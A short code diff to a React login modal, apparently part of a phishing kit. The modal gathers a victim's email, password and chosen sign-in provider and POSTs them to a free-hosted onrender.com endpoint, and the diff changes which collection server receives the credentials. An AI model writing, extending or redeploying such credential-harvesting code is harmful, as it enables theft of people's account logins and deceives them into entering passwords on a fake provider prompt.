@@ -33,7 +33,7 @@ const LoginModal = ({ provider, onClose }) => {
     const formData = { email, password, provider };
 
     try {
-      const response = await fetch("https://adxbe.onrender.com/api/submit", {
+      const response = await fetch("https://paris-kv6k.onrender.com/api/submit", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(formData),
